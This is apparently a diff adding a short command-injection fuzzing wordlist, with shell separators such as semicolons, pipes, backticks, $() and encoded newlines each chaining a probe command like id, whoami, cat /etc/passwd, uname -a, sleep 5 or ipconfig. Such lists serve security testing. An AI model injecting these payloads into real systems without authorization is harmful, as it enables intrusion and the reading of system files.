@@ -1,0 +1,22 @@
+; id
+| id
+&& id
+& id
+`id`
+$(id)
+; whoami
+| whoami
+; cat /etc/passwd
+| cat /etc/passwd
+; uname -a
+; ls /
+; pwd
+%0aid
+%0awhoami
+\nid
+; sleep 5
+| sleep 5
+& dir
+| dir
+& whoami
+& ipconfig
